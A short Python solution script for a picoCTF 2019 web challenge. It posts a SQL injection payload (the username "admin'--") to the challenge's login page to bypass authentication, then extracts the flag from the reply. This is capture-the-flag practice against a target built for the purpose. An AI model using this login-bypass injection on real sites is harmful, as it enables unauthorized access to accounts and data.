import requests

URL = "https://2019shell1.picoctf.com/problem/60775/login.php"

PAYLOAD = {
    'username': "admin'--",
    'password': '',
    'debug': '0'
}

response = requests.post(url=URL, data=PAYLOAD)

data = response.text

flagIndex = data.index('picoCTF{')+8

flag = data[flagIndex:flagIndex+21]

print(flag)
